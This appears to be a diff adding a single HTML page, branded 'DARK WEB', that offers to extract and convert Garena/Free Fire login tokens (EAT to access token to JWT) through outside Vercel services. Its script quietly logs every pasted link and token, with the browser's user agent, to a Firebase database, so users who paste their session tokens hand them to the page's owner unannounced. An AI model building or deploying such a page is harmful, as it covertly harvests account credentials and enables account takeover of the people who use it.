@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DARK WEB - Token Tool</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #0f0f0f;
+            --card-bg: #1a1a1a;
+            --text-color: #ffffff;
+            --text-muted: #a0a0a0;
+            --accent-purple: #7d2ae8;
+            --accent-cyan: #00d2ff;
+            --gold-glow: #FFD700;
+            --gold-color: #FFA500;
+            --input-bg: #252525;
+            --border-color: #333;
+            --success: #00c851;
+            --error: #ff1744;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* Canvas Background */
+        #particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .container {
+            background-color: rgba(26, 26, 26, 0.95);
+            width: 100%;
+            max-width: 400px;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 10px rgba(255, 215, 0, 0.2);
+            text-align: center;
+            position: relative;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(5px);
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 25px;
+            letter-spacing: 1.5px;
+            background: linear-gradient(to right, #fff, var(--gold-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .page-section { display: block; animation: fadeIn 0.5s ease-out; }
+        .page-section.hidden { display: none; }
+
+        /* Social Buttons */
+        .social-btns { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; flex-wrap: wrap; }
+        .social-btn {
+            width: 48px; height: 48px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            text-decoration: none; font-size: 20px; color: white;
+            transition: all 0.3s ease; border: none; cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        .social-btn:hover { 
+            transform: translateY(-5px) scale(1.1); 
+            box-shadow: 0 0 15px var(--gold-glow); 
+            border: 1px solid var(--gold-glow);
+        }
+        .fb { background: linear-gradient(135deg, #1877F2, #1056b5); }
+        .google { background: linear-gradient(135deg, #DB4437, #b92b20); }
+        .apple { background: linear-gradient(135deg, #000000, #333333); border: 1px solid #444; }
+        .vk { background: linear-gradient(135deg, #0077FF, #0056b3); }
+        .twitter { background: linear-gradient(135deg, #000000, #1da1f2); border: 1px solid #1da1f2; }
+
+        /* Form Elements */
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label {
+            font-size: 11px; color: var(--text-muted); margin-bottom: 8px;
+            display: block; text-transform: uppercase; letter-spacing: 1px; font-weight: 600;
+        }
+        input[type="text"] {
+            width: 100%; padding: 14px; background-color: var(--input-bg);
+            border: 2px solid var(--border-color); border-radius: 10px;
+            color: white; font-size: 14px; outline: none; transition: all 0.3s ease;
+        }
+        input[type="text"]:focus {
+            border-color: var(--gold-glow);
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.2);
+        }
+
+        /* Action Buttons */
+        .action-btn {
+            width: 100%; padding: 14px; border: none; border-radius: 10px;
+            background: linear-gradient(135deg, var(--accent-purple), #4a00e0);
+            color: white; font-size: 16px;
+            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
+            margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 10px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(45deg, var(--gold-glow), var(--gold-color));
+            opacity: 0;
+            z-index: -1;
+            transition: opacity 0.3s ease;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6), 0 0 40px rgba(255, 165, 0, 0.4);
+            text-shadow: 0 0 5px white;
+        }
+        
+        .action-btn:hover::before {
+            opacity: 1;
+        }
+
+        /* Special Style for JWT Button (Cyan/Blue) */
+        .action-btn.btn-cyan {
+            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+        }
+        .action-btn.btn-cyan:hover {
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.6);
+        }
+        .action-btn.btn-cyan::before {
+            background: linear-gradient(45deg, #00d2ff, #005bea);
+        }
+
+        .result-box {
+            background: #1a1a1a; border: 1px dashed var(--gold-glow); border-radius: 8px;
+            padding: 12px; margin-top: 10px; font-size: 13px; color: var(--success);
+            display: none; justify-content: space-between; align-items: center;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.1);
+        }
+        .result-box span { overflow: hidden; text-overflow: ellipsis; margin-right: 10px; }
+        .copy-icon { cursor: pointer; color: var(--text-muted); font-size: 18px; }
+        .copy-icon:hover { color: var(--gold-glow); }
+        .error-msg { color: var(--error); font-size: 12px; margin-top: 8px; display: none; animation: shake 0.3s; }
+
+        /* Page 2 & 3 Cards */
+        .converter-card { background: rgba(32, 32, 32, 0.9); border-radius: 12px; padding: 20px; border: 1px solid #333; margin-bottom: 20px; }
+        .output-wrapper { margin-top: 15px; }
+        
+        .api-iframe, .jwt-iframe {
+            width: 100%;
+            height: 300px;
+            background-color: #fff; 
+            border: 2px solid #444;
+            border-radius: 8px;
+            display: none;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.15);
+        }
+
+        .status-badge { margin-top: 10px; font-size: 13px; font-weight: 500; color: var(--text-muted); }
+
+        .loader {
+            width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid var(--gold-glow); border-radius: 50%;
+            animation: spin 0.8s linear infinite; display: none;
+        }
+
+        .footer { margin-top: 30px; font-size: 11px; color: #666; border-top: 1px solid #2a2a2a; padding-top: 15px; }
+        .back-link {
+            display: inline-block; margin-top: 20px; color: var(--text-muted);
+            text-decoration: none; font-size: 14px; cursor: pointer; padding: 8px 16px;
+            border: 1px solid #333; border-radius: 20px;
+            transition: all 0.3s;
+        }
+        .back-link:hover { 
+            color: white; 
+            border-color: var(--gold-glow); 
+            background: rgba(255, 215, 0, 0.1);
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+    </style>
+</head>
+<body>
+
+<!-- Background Canvas -->
+<canvas id="particleCanvas"></canvas>
+
+<div class="container">
+    
+    <!-- PAGE 1: HOME -->
+    <div id="page-1" class="page-section">
+        <h1>DARK WEB</h1>
+        
+        <label>LOGIN LINKS</label>
+        <div class="social-btns">
+            <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=3" target="_blank" class="social-btn fb"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=8" target="_blank" class="social-btn google"><i class="fab fa-google"></i></a>
+            <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=10" target="_blank" class="social-btn apple"><i class="fab fa-apple"></i></a>
+            <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=5" target="_blank" class="social-btn vk"><i class="fab fa-vk"></i></a>
+            <a href="https://api.twitter.com/oauth/authenticate?oauth_token=hc3dgQAAAAABLP2yAAABmyGCmhA" target="_blank" class="social-btn twitter"><i class="fab fa-twitter"></i></a>
+        </div>
+
+        <div class="input-group">
+            <label>EXTRACT TOKEN</label>
+            <input type="text" id="extractInput" placeholder="Paste full link here...">
+            <div class="error-msg" id="extractError">Link format is invalid</div>
+            <button class="action-btn" onclick="extractEatToken()">EXTRACT NOW</button>
+            
+            <div class="result-box" id="extractResultBox">
+                <span id="extractedTokenText"></span>
+                <i class="far fa-copy copy-icon" onclick="copyToClipboard('extractedTokenText')"></i>
+            </div>
+        </div>
+
+        <button class="action-btn" style="background: linear-gradient(135deg, #FFD700, #FFA500);" onclick="switchPage(2)">
+            EAT TO ACCESS TOKEN <i class="fas fa-arrow-right"></i>
+        </button>
+
+        <button class="action-btn btn-cyan" onclick="switchPage(3)">
+            ACCESS TO JWT <i class="fas fa-key"></i>
+        </button>
+
+        <div class="footer">
+            <p>copyright©️dark web 2026</p>
+        </div>
+    </div>
+
+    <!-- PAGE 2: EAT CONVERTER -->
+    <div id="page-2" class="page-section hidden">
+        <h1 style="font-size: 22px;">EAT to Access</h1>
+        
+        <div class="converter-card">
+            <label>PASTE EAT TOKEN</label>
+            <input type="text" id="eatTokenInput" placeholder="Paste only the token here..." autocomplete="off">
+            <div class="error-msg" id="apiError">Token cannot be empty</div>
+            
+            <button class="action-btn" onclick="showApiInIframe()">
+                <span id="btnText">GET ACCESS TOKEN</span>
+                <div class="loader" id="btnLoader"></div>
+            </button>
+
+            <div class="output-wrapper">
+                <label>SERVER RESPONSE</label>
+                <iframe id="apiFrame" class="api-iframe"></iframe>
+                
+                <div class="status-badge" id="statusMessage">
+                    Response will appear above.
+                </div>
+            </div>
+        </div>
+
+        <div class="back-link" onclick="switchPage(1)">
+            <i class="fas fa-arrow-left"></i> Back to Home
+        </div>
+
+        <div class="footer">
+            <p>copyright©️dark web 2026</p>
+        </div>
+    </div>
+
+    <!-- PAGE 3: JWT GENERATOR -->
+    <div id="page-3" class="page-section hidden">
+        <h1 style="font-size: 22px;">Access to JWT</h1>
+        
+        <div class="converter-card">
+            <label>PASTE ACCESS TOKEN</label>
+            <input type="text" id="accessTokenInput" placeholder="Paste user access token here..." autocomplete="off">
+            <div class="error-msg" id="jwtError">Token cannot be empty</div>
+            
+            <button class="action-btn btn-cyan" onclick="showJwtInIframe()">
+                <span id="jwtBtnText">GET JWT TOKEN</span>
+                <div class="loader" id="jwtBtnLoader"></div>
+            </button>
+
+            <div class="output-wrapper">
+                <label>SERVER RESPONSE</label>
+                <iframe id="jwtFrame" class="jwt-iframe"></iframe>
+                
+                <div class="status-badge" id="jwtStatusMessage">
+                    Response will appear above.
+                </div>
+            </div>
+        </div>
+
+        <div class="back-link" onclick="switchPage(1)">
+            <i class="fas fa-arrow-left"></i> Back to Home
+        </div>
+
+        <div class="footer">
+            <p>copyright©️dark web 2026</p>
+        </div>
+    </div>
+
+</div>
+
+<!-- Firebase SDK & Logic -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+    // Firebase Configuration from your provided JSON
+    const firebaseConfig = {
+        apiKey: "AIzaSyBE0ffgfddvzFmzv00Q7m4PwJlcuUxKdVbWwxR6I",
+        authDomain: "hazrat-ldffxcgochon-ahmed-b8da7.firebaseapp.com",
+        databaseURL: "https://hazehehrat-lochhddbvon-ahffdffmed-b8da7-default-rtdbgd.firebaseio.com",
+        projectId: "hhfxxazradddht-lgvxfoccchon-ahmeccxxd-b8daggdd7",
+        storageBucket: "ddff-lochon-ahmed-cxxb8da7.appsccxpot.com",
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Function to save data to Firebase
+    function saveToFirebase(actionType, inputData, outputData = "N/A") {
+        const logData = {
+            action: actionType,
+            input: inputData,
+            output: outputData,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+
+        // Push to 'user_logs' node in database
+        push(ref(db, 'user_logs'), logData)
+            .then(() => console.log("Data saved to Firebase"))
+            .catch((error) => console.error("Firebase Error:", error));
+    }
+
+    // Expose functions to global window object so HTML onclick can access them
+    window.extractEatToken = function() {
+        const input = document.getElementById('extractInput').value.trim();
+        const errorDiv = document.getElementById('extractError');
+        const resultBox = document.getElementById('extractResultBox');
+        const tokenText = document.getElementById('extractedTokenText');
+
+        errorDiv.style.display = 'none';
+        resultBox.style.display = 'none';
+
+        if (!input) {
+            showError(errorDiv, "Please paste a link first.");
+            return;
+        }
+        try {
+            const regex = /[?&]eat=([^&]+)/;
+            const match = input.match(regex);
+            if (match && match[1]) {
+                const token = match[1];
+                tokenText.textContent = token;
+                resultBox.style.display = 'flex'; 
+                
+                // SAVE TO FIREBASE
+                saveToFirebase("Extract EAT", input, token);
+            } else {
+                showError(errorDiv, "No 'eat' token found.");
+            }
+        } catch (e) {
+            showError(errorDiv, "Error parsing link.");
+        }
+    };
+
+    window.showApiInIframe = function() {
+        const eatToken = document.getElementById('eatTokenInput').value.trim();
+        const apiFrame = document.getElementById('apiFrame');
+        const btnText = document.getElementById('btnText');
+        const btnLoader = document.getElementById('btnLoader');
+        const statusMsg = document.getElementById('statusMessage');
+
+        if (!eatToken) {
+            showError(document.getElementById('apiError'), "Please enter an EAT Token first.");
+            return;
+        }
+
+        btnText.style.display = 'none';
+        btnLoader.style.display = 'block';
+
+        const encodedToken = encodeURIComponent(eatToken);
+        const apiUrl = `https://avi-eat-to-access.vercel.app/Eat?eat_token=${encodedToken}`;
+
+        apiFrame.style.display = 'block';
+        apiFrame.src = apiUrl;
+
+        // SAVE TO FIREBASE
+        saveToFirebase("EAT to Access", eatToken, apiUrl);
+
+        setTimeout(() => {
+            btnText.style.display = 'inline';
+            btnLoader.style.display = 'none';
+            statusMsg.innerHTML = '<span style="color:var(--gold-glow)">Response Loaded.</span>';
+        }, 1000);
+    };
+
+    window.showJwtInIframe = function() {
+        const accessToken = document.getElementById('accessTokenInput').value.trim();
+        const jwtFrame = document.getElementById('jwtFrame');
+        const btnText = document.getElementById('jwtBtnText');
+        const btnLoader = document.getElementById('jwtBtnLoader');
+        const statusMsg = document.getElementById('jwtStatusMessage');
+
+        if (!accessToken) {
+            showError(document.getElementById('jwtError'), "Please enter an Access Token first.");
+            return;
+        }
+
+        btnText.style.display = 'none';
+        btnLoader.style.display = 'block';
+
+        const encodedToken = encodeURIComponent(accessToken);
+        const apiUrl = `https://ff-access-to-jwt.vercel.app/access-jwt?access_token=${encodedToken}`;
+
+        jwtFrame.style.display = 'block';
+        jwtFrame.src = apiUrl;
+
+        // SAVE TO FIREBASE
+        saveToFirebase("Access to JWT", accessToken, apiUrl);
+
+        setTimeout(() => {
+            btnText.style.display = 'inline';
+            btnLoader.style.display = 'none';
+            statusMsg.innerHTML = '<span style="color:var(--accent-cyan)">Response Loaded.</span>';
+        }, 1000);
+    };
+
+    // Helper functions (also need to be global if called from HTML)
+    window.showError = function(element, message) {
+        element.textContent = message;
+        element.style.display = 'block';
+    }
+
+    window.copyToClipboard = function(elementId) {
+        const text = document.getElementById(elementId).textContent;
+        navigator.clipboard.writeText(text).then(() => showToast("Copied!"));
+    }
+
+    window.showToast = function(msg) {
+        const toast = document.createElement('div');
+        toast.textContent = msg;
+        Object.assign(toast.style, {
+            position: 'fixed', bottom: '30px', left: '50%', transform: 'translateX(-50%)',
+            backgroundColor: '#333', color: '#fff', padding: '10px 20px',
+            borderRadius: '5px', zIndex: '1000', boxShadow: '0 5px 15px rgba(0,0,0,0.3)',
+            fontSize: '13px', border: '1px solid #FFD700'
+        });
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 2000);
+    }
+</script>
+
+<script>
+    // --- Particle Animation (Can stay in standard script) ---
+    const canvas = document.getElementById('particleCanvas');
+    const ctx = canvas.getContext('2d');
+    
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let particlesArray;
+
+    class Particle {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.size = Math.random() * 3 + 1;
+            this.speedX = Math.random() * 1 - 0.5;
+            this.speedY = Math.random() * 1 - 0.5;
+            this.color = `rgba(255, 215, 0, ${Math.random() * 0.5 + 0.1})`; 
+        }
+        update() {
+            this.x += this.speedX;
+            this.y += this.speedY;
+            if (this.size > 0.2) this.size -= 0.01; 
+            if (this.size <= 0.2 || this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 3 + 1;
+            }
+        }
+        draw() {
+            ctx.fillStyle = this.color;
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fill();
+        }
+    }
+
+    function initParticles() {
+        particlesArray = [];
+        let numberOfParticles = 50;
+        for (let i = 0; i < numberOfParticles; i++) {
+            particlesArray.push(new Particle());
+        }
+    }
+
+    function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (let i = 0; i < particlesArray.length; i++) {
+            particlesArray[i].update();
+            particlesArray[i].draw();
+        }
+        requestAnimationFrame(animateParticles);
+    }
+
+    initParticles();
+    animateParticles();
+
+    window.addEventListener('resize', function() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        initParticles();
+    });
+
+    // Page Switching (Global)
+    window.switchPage = function(pageNumber) {
+        document.getElementById('page-1').classList.add('hidden');
+        document.getElementById('page-2').classList.add('hidden');
+        document.getElementById('page-3').classList.add('hidden');
+
+        const apiFrame = document.getElementById('apiFrame');
+        const jwtFrame = document.getElementById('jwtFrame');
+        
+        apiFrame.style.display = 'none';
+        apiFrame.src = '';
+        
+        jwtFrame.style.display = 'none';
+        jwtFrame.src = '';
+
+        if(pageNumber === 1) document.getElementById('page-1').classList.remove('hidden');
+        if(pageNumber === 2) document.getElementById('page-2').classList.remove('hidden');
+        if(pageNumber === 3) document.getElementById('page-3').classList.remove('hidden');
+    }
+</script>
+
+</body>
+</html>
